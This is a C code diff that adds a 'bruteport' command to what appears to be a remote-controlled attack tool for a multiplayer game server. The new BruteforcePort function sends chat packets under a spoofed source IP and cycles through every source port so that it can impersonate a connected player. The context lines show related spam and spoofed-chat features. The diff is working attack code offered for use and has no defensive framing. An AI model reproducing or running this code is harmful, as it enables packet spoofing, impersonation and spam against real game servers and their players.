@@ -491,6 +491,36 @@ void SpamIPs(const char *IP, int Port)
 	}
 }
 
+void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	int i;
+	for(int i = 1024; i < 65535; i++)
+	{
+		m_FromIP[0] = inet_addr(SpoofIP);
+		m_FromPort = htons(i);
+
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+		Reset(0);
+
+		char aMsg[256];
+		sprintf_s(aMsg, sizeof(aMsg), "%i", i);
+
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
+		SendData((const char*)buffer, BufferSize, 0);
+
+		// little delay to reduce traffic
+		Sleep(1);
+	}
+}
+
 void Tick()
 {
 	if (m_Tick > 500) // once in 500 ms
@@ -645,6 +675,18 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>", strlen("[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>"), 0);
+			}
+			else if(strcmp(aCmd[0], "bruteport") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					BruteforcePort(aCmd[1], Port, aCmd[3]);
+
+					send(g_Client, "[Server]: Port bruteforcing in progress! (Might take up to a minute)", strlen("[Server]: Port bruteforcing in progress! (Might take up to a minute)"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: bruteport <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: bruteport <srvip> <srvport> <spoofip>"), 0);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
